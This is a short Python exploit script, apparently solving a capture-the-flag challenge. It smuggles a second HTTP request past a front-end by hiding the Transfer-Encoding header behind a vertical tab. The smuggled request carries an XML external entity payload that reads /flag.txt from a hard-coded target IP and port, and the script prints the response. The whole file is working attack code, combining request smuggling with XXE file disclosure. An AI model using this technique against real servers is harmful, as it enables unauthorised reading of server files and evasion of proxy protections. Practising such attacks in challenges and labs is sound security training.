import socket

exploit = '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///flag.txt">]><root>&test;</root>'

payload1 = ''
payload1 += 'GET / HTTP/1.1\r\n'
payload1 += 'Host: 103.167.132.153:55869\r\n\r\n'

payload = '0\r\n\r\n'
payload += 'POST /api/v1/document/render HTTP/1.1\r\n'
payload += 'Host: 103.167.132.153:55869\r\n'
payload += 'Content-Type: application/xml\r\n'
payload += 'Content-Length: {}\r\n\r\n'.format(len(exploit))
payload += exploit

raw_request = ''
raw_request += 'POST / HTTP/1.1\r\n'
raw_request += 'Host: 103.167.132.153:55869\r\n'
raw_request += 'Content-Length: {}\r\n'.format(len(payload))
raw_request += 'Transfer-Encoding: \vchunked\r\n\r\n' + payload + payload1

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect(('103.167.132.153', 55869))
    s.send(raw_request.encode())
    while True:
        response = s.recv(1024).decode("ascii")
        if response != '':
            print(response)
        else:
            break